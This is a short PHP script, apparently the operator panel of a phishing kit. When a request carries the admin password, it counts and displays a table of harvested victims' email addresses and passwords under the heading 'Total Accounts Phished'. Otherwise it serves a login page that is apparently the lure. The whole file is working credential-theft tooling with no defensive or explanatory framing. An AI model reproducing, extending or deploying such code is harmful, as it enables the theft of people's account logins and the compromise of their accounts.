<?php

include('config.php');

if ($_GET['admin'] == $admin_pass)
{
	echo '
		<table cellpadding="5" border="0">';
		
	$result = mysql_query("SELECT * FROM `$table` ORDER BY `id` DESC LIMIT 1000;");
	
	$counting = mysql_query("SELECT * FROM `$table`;");
	$count = mysql_num_rows($counting);
	mysql_free_result($counting);
	
	echo '
		<tr>
			<td>Total Accounts Phished</td>
			<td>' . $count . '</td>
		</tr>';
	
	while ($row = mysql_fetch_assoc($result))
	{
		echo '
			<tr>
				<td>' . $row['email'] . '</td><td>' . $row['pass'] . '</td>
			</tr>';
	}
	mysql_free_result($result);
	
	echo '
		</table>';
}
else
{
	require('login.html');
}

?>
